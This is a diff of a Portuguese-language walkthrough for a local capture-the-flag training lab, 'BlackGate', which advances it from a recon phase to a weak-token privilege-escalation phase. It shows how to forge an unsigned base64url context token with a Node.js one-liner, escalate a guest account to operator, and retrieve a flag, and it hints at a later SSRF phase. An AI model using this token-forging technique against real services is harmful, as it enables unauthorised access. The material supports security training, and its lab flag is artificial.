@@ -1,6 +1,6 @@
-# Lab 05 - BlackGate - Walkthrough da Fase 2
+# Lab 05 - BlackGate - Walkthrough da Fase 3
 
-Este walkthrough cobre a **Fase 2 — Recon & Metadata Exposure** do Lab 05. A aplicação ainda não implementa a cadeia completa de exploração; esta fase valida base visual, sessão, navegação, enumeração, metadados e uma inconsistência leve de autorização.
+Este walkthrough cobre a **Fase 3 — Weak Token / Role Escalation** do Lab 05. A aplicação ainda não implementa SSRF, file read, command injection, worker, upload ou admin final.
 
 ## Como subir
 
@@ -29,7 +29,7 @@ Resultado esperado:
 {
   "service": "blackgate",
   "status": "ok",
-  "version": "1.1.0-phase2"
+  "version": "1.2.0-phase3"
 }
 ```
 
@@ -40,10 +40,8 @@ Abra `http://localhost:8096`. A aplicação deve redirecionar para `/login`.
 Use uma conta comum:
 
 ```text
-operator / operator123
+guest / guest123
 ```
-
-Também existem contas comuns para `analyst` e `guest`. A conta administrativa está presente no cenário, mas não é liberada na Fase 2.
 
 Resultado esperado:
 
@@ -51,186 +49,214 @@ Resultado esperado:
 - redirecionamento para `/dashboard`;
 - topo com usuário, role e link de logout.
 
-## Enumeração pública
+## Recon de Fase 2
 
-Antes ou depois do login, abra:
-
-```text
-http://localhost:8096/robots.txt
-http://localhost:8096/.well-known/security.txt
-http://localhost:8096/api/status
-http://localhost:8096/api/version
-http://localhost:8096/api/client-config
-http://localhost:8096/api/routes
-```
-
-O que observar:
-
-- `robots.txt` cita caminhos planejados como `/debug`, `/legacy`, `/api/internal` e `/backups`.
-- `security.txt` aponta para `/security-policy`.
-- `/api/status` mostra gateway degradado em ambiente de treinamento.
-- `/api/version` informa `1.1.0-phase2` e build `bg-phase2-recon`.
-- `/api/client-config` expõe configuração pública sem segredo real.
-- `/api/routes` mistura rotas públicas, autenticadas e planejadas.
-
-## Página security-policy
-
-Abra:
+Confirme os endpoints públicos:
 
 ```text
-http://localhost:8096/security-policy
+/robots.txt
+/.well-known/security.txt
+/api/status
+/api/version
+/api/client-config
+/api/routes
+/debug/ping
 ```
 
-Resultado esperado:
-
-- página visual pública usando o tema BlackGate;
-- política fictícia de reporte;
-- reforço de que o escopo é local.
-
-## Debug ping limitado
-
-Abra:
-
-```text
-http://localhost:8096/debug/ping
-```
-
-Resultado esperado:
-
-```json
-{
-  "pong": true,
-  "debug": false,
-  "message": "Debug interface is disabled in production profile."
-}
-```
-
-Depois envie a mesma rota com o header:
+Com o header abaixo, `/debug/ping` revela metadados limitados de contexto:
 
 ```text
 X-Debug-Token: guest-debug
 ```
 
-Resultado esperado:
+Observe o bloco:
 
 ```json
 {
-  "pong": true,
-  "debug": true,
-  "message": "Debug handshake accepted for limited diagnostics.",
-  "diagnostics": {
-    "routes": ["/debug/ping", "/debug/trace"],
-    "note": "Full trace requires elevated operator context."
+  "context": {
+    "header": "X-BG-Context",
+    "verify": "/api/context/verify",
+    "note": "Legacy context validation is enabled for compatibility checks."
   }
 }
 ```
 
-`/debug/trace` não é funcional nesta fase e retorna que ainda não está implementado.
-
-## Dashboard
-
-Em `/dashboard`, valide:
-
-- usuário logado;
-- role atual;
-- cards de métricas;
-- `Gateway Status: degraded`;
-- `Metadata Sync: pending`;
-- `Legacy Migration: scheduled`;
-- eventos recentes.
-
-Também existem comentários HTML discretos sobre migração legada e uso de hostnames como identificadores de inventário.
-
-## Tickets e API de tickets
+## Página Context
 
 Abra:
 
 ```text
-http://localhost:8096/tickets
-```
-
-Observe os links discretos `API view`.
-
-Com uma sessão ativa, acesse exemplos como:
-
-```text
-http://localhost:8096/api/tickets/BG-1001
-http://localhost:8096/api/tickets/BG-1004
-http://localhost:8096/api/tickets/BG-1005
-```
-
-O comportamento esperado:
-
-- sem login, a API retorna `authentication_required`;
-- tickets permitidos para a role retornam dados completos;
-- tickets com `exposure: metadata` podem retornar metadados limitados mesmo quando a role não deveria ver o objeto completo;
-- tickets restritos sem exposição de metadata retornam `forbidden`.
-
-Exemplo didático com `guest`:
-
-- `BG-1001` retorna informação permitida;
-- `BG-1004` ou `BG-1005` retornam metadados limitados;
-- `BG-1002` tende a retornar `forbidden`.
-
-Isso cria uma falha leve no estilo IDOR/BOLA, mas sem flag, senha ou exploração final.
-
-## Assets e API de assets
-
-Abra:
-
-```text
-http://localhost:8096/assets
-```
-
-A interface mostra assets conforme o contexto da role. Em seguida, teste hostnames diretamente pela API:
-
-```text
-http://localhost:8096/api/assets/api-core.internal
-http://localhost:8096/api/assets/files-vault.internal
-http://localhost:8096/api/assets/legacy-panel.internal
-```
-
-O comportamento esperado:
-
-- sem login, a API retorna `authentication_required`;
-- com login, qualquer usuário autenticado consegue consultar metadados por hostname;
-- a resposta contém `hostname`, `type`, `environment`, `status`, `exposure` e `notes`;
-- nenhum serviço interno real é acessado.
-
-## JavaScript público
-
-Abra DevTools > Sources ou acesse:
-
-```text
-http://localhost:8096/static/js/app.js
+http://localhost:8096/context
 ```
 
 Observe:
 
-- `BlackGateClient`;
-- `BLACKGATE_CONFIG`;
-- `apiBase`;
-- rotas de status, version, client config e routes;
-- hints como `/debug`, `/legacy` e `/api/assets/{hostname}`.
+- role da sessão;
+- issuer `legacy-context-service`;
+- header `X-BG-Context`;
+- link para `/api/context/me`;
+- indicação de compatibility mode.
 
-Não há segredo real, senha admin ou flag final nesse arquivo.
+## Obter o token de contexto
 
-## Logout
-
-Abra:
+Com a sessão de `guest`, abra:
 
 ```text
-http://localhost:8096/logout
+http://localhost:8096/api/context/me
+```
+
+Resposta esperada:
+
+```json
+{
+  "user": "guest",
+  "role": "guest",
+  "scope": "limited",
+  "context_token": "...",
+  "hint": "Context tokens are consumed by legacy operator endpoints."
+}
+```
+
+O token é um JSON em base64url sem assinatura. Essa é a falha didática da Fase 3.
+
+## Decodificar e modificar o token
+
+Payload original esperado:
+
+```json
+{
+  "user": "guest",
+  "role": "guest",
+  "scope": "limited",
+  "issued_by": "legacy-context-service"
+}
+```
+
+Payload manipulado:
+
+```json
+{
+  "user": "guest",
+  "role": "operator",
+  "scope": "operations",
+  "issued_by": "legacy-context-service"
+}
+```
+
+Gere o token manipulado com Node.js:
+
+```bash
+TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
+echo "$TOKEN"
+```
+
+## Validar o token
+
+Envie o token para:
+
+```text
+POST /api/context/verify
+Header: X-BG-Context: <TOKEN>
 ```
 
 Resultado esperado:
 
-- sessão encerrada;
-- redirecionamento para `/login`;
-- `/dashboard`, `/api/tickets/:id` e `/api/assets/:hostname` voltam a exigir autenticação.
+```json
+{
+  "valid": true,
+  "context": {
+    "user": "guest",
+    "role": "operator",
+    "scope": "operations",
+    "issued_by": "legacy-context-service"
+  },
+  "warning": "Legacy context tokens are not intended for direct client manipulation."
+}
+```
+
+## Acessar briefing operator
+
+Use:
+
+```text
+GET /api/operator/briefing
+Header: X-BG-Context: <TOKEN>
+```
+
+Resultado esperado:
+
+```json
+{
+  "classification": "operator-only",
+  "briefing": "Legacy context validation accepted elevated operator scope.",
+  "phase": "3",
+  "finding": "weak unsigned context token",
+  "flag": "FLAG{blackgate_weak_token_role_escalation_phase3}",
+  "next_hint": "Operator context can see internal gateway metadata, but direct internal access is still blocked."
+}
+```
+
+## Gateway metadata
+
+Com o mesmo token, acesse:
+
+```text
+/api/operator/gateway-metadata
+```
+
+Resultado esperado:
+
+```json
+{
+  "gateway": "gw-blackgate.local",
+  "trusted_upstream": "api-core.internal",
+  "internal_candidates": [
+    "api-core.internal",
+    "files-vault.internal",
+    "legacy-panel.internal"
+  ],
+  "blocked_paths": [
+    "/api/internal/files",
+    "/legacy",
+    "/debug/trace"
+  ],
+  "phase4_hint": "Some internal checks trust gateway-originated requests."
+}
+```
+
+Isso prepara a Fase 4, mas ainda não implementa SSRF.
+
+## Erros esperados
+
+Sem sessão:
+
+```json
+{
+  "error": "authentication_required",
+  "message": "Login required to access this resource."
+}
+```
+
+Sem token:
+
+```json
+{
+  "error": "bad_request",
+  "message": "Context token is required."
+}
+```
+
+Com token `guest` não manipulado:
+
+```json
+{
+  "error": "forbidden",
+  "message": "Valid operator context required."
+}
+```
 
 ## O que deve ficar para fases futuras
 
-A Fase 2 não implementa SSRF funcional, JWT explorável, command injection, upload, path traversal, fila real, banco externo, flag final ou exploração de admin.
+A Fase 3 não implementa SSRF funcional, JWT explorável de admin, command injection, upload, path traversal, fila real, banco externo, flag final ou exploração de admin.
 
-Ela prepara o terreno para a próxima etapa: token fraco ou role escalation controlada.
+Ela prepara o terreno para **Fase 4 — Gateway Trust / SSRF Setup**.
